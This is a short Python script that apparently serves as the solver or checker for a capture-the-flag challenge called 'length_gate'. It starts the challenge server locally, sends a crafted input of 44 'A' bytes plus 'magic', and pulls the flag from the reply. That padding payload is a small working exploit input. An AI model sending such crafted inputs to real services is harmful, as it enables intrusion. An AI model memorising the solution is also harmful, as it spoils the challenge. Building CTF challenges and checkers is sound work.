#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import re
import socket
import threading
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    server_path = root / 'docker' / 'server.py'
    spec = importlib.util.spec_from_file_location('length_gate_server', server_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    server = module.Server(('127.0.0.1', 18104), module.Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        with socket.create_connection(('127.0.0.1', 18104), timeout=3) as conn:
            conn.recv(256)
            conn.sendall(b'A' * 44 + b'magic\n')
            data = conn.recv(256).decode('utf-8', errors='ignore')
        match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', data)
        if not match:
            raise SystemExit('flag not found')
        print(match.group(0))
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


if __name__ == '__main__':
    main()
